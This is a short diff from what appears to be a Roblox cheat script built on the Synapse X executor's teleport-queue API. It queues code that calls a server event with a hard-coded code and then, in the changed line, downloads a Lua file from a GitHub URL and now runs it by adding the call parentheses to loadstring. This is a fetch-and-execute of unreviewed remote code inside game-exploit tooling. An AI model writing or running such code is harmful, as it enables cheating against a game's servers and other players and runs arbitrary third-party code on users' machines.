@@ -7,7 +7,7 @@ syn.queue_on_teleport([[
     print(game:GetService("ReplicatedStorage").Events.reserved:InvokeServer("40W6QKK"))
     else
         repeat wait() until game.ReplicatedStorage:FindFirstChild("Stats" .. game.Players.LocalPlayer.Name)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/CFA-HUB/CFA-HUB/main/test.lua"))
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/CFA-HUB/CFA-HUB/main/test.lua"))()
     end
     
     
